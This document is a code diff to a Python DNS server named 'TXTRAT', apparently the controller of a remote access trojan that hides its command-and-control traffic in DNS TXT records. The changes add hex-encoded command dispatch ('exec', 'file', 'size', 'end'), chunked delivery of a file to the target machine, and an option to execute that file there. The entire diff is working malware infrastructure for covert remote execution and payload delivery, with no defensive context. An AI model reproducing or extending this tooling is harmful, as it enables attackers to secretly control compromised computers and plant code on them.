@@ -2,6 +2,8 @@ import socket, glob, json
 from optparse import OptionParser
 
 out = ''
+size = 0
+file = ''
 
 def load_zones():
 
@@ -82,34 +84,54 @@ def printreturn():
     out = ''
 
 def formatout(domain):
-    global out
+    global file
     printreturn()
+    file = "False"
 
     dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': 'confirmed end'}]}
 
     return dictreturn
 
-def pullchunksfirst(domain):
-    global out
+def sendfile(domain):
+    global file
 
-    c2id = '31337'							# set this later when working with multiple connections
-    chunk = domain[0]
-    out += bytes.fromhex(chunk).decode('utf-8')
+    f = open(file)
+    f.seek(int(domain[1]))
+    data = f.read(255)
 
-    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': c2id}]}
+    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': data}]}
 
     return dictreturn
 
 def pullchunks(domain):
     global out
 
-    c2id = domain[0]
+    #c2id = domain[1]
     chunk = domain[1]
     out += bytes.fromhex(chunk).decode('utf-8')
 
     dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': chunk}]}
 
     return dictreturn
+
+def sizefile(domain):
+    global size
+    sendsize = (int(size/255) + 1)
+    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': str(sendsize)}]}
+
+    return dictreturn
+
+def cases(domain):
+    command = bytes.fromhex(domain[0]).decode('utf-8')
+
+    options = {
+        "end": formatout,
+        "file": sendfile,
+        "exec": pullchunks,
+        "size": sizefile,
+    }
+
+    return options[command](domain)
 
 def getzone(domain):
     global zonedata
@@ -118,12 +140,7 @@ def getzone(domain):
     if zone_name in zonedata:
         return zonedata[zone_name]
     else:
-        if len(domain) == 4:
-            return formatout(domain)
-        elif len(domain) == 5:
-            return pullchunksfirst(domain)
-        elif len(domain) == 6:
-            return pullchunks(domain)
+        return cases(domain)
 
 def getrecs(data):
     domain, questiontype = getquestiondomain(data)
@@ -233,9 +250,10 @@ def buildresponse(data, command):
 
     return dnsheader + dnsquestion + dnsbody
 
-
 def main():
     global out
+    global size
+    global file
 
     usage = "TXTRAT"
     parser = OptionParser()
@@ -251,28 +269,52 @@ def main():
         default = '127.0.0.1'
     )
 
+    # Send file
+    parser.add_option(
+        "-f",
+        "--file",
+        help = "Send a file to the target machine. Provide absolute path",
+        action = "store",
+        type = "string",
+        dest = "file",
+        default = "False"
+    )
+
+    # Execute file
+    parser.add_option(
+        "-e",
+        "--execute",
+        help = "Execute file assigned to --file option. --file option must be set",
+        action = "store_true",
+        dest = "execute",
+        default = False
+    )
+
     (options, args) = parser.parse_args()
 
     ip = options.address
     port = 53
+    file = options.file
+    execute = options.execute
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((ip, port))
 
     while 1:
-        command = input("input: ")
+        if file != "False":
+            f = open(file, 'rb')
+            f.seek(0, 2)
+            size = f.tell()
+            if execute:
+                command = "filex"
+            else:
+                command = "file"
+        else:
+            command = input("input: ")
         out += command + "\n"
         while len(out) != 0:
             data, addr = sock.recvfrom(512)
             r = buildresponse(data, command)
             sock.sendto(r, addr)
-
-
-    """command = input("input: ")
-    while 1:
-        data, addr = sock.recvfrom(512)
-        r = buildresponse(data, command)
-        sock.sendto(r, addr)
-    """
 
 main()
